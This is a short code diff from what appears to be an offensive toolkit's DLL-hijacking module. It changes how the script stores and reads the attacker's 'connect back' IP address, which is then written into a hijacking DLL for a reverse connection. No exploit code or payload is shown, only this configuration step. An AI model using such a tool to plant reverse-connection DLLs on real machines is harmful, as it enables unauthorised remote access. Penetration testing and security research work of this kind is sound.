@@ -68,13 +68,11 @@ filewrite=file("src/program_junk/dll/%s%s" % (filename1,extension),"w")
 filewrite.write("EMPTY")
 filewrite.close()
 
-if not os.path.isfile("src/program_junk/ipaddr.file"):
-        ipaddr=raw_input(setprompt(["2","15"], "IP address to connect back on"))
-
-if os.path.isfile("src/program_junk/ipaddr.file"):
-        fileopen=file("src/program_junk/ipaddr.file", "r")
-        for line in fileopen:
-                ipaddr=line.rstrip()
+if check_options("IPADDR=") != 0:
+	ipaddr = check_options("IPADDR=")
+else:
+	ipaddr=raw_input(setprompt(["2","15"], "IP address to connect back on"))
+	update_options("IPADDR=" + ipaddr)
 
 # replace ipaddress with one that we need for reverse connection back
 fileopen=open("src/webattack/dll_hijacking/hijacking.dll" , "rb")
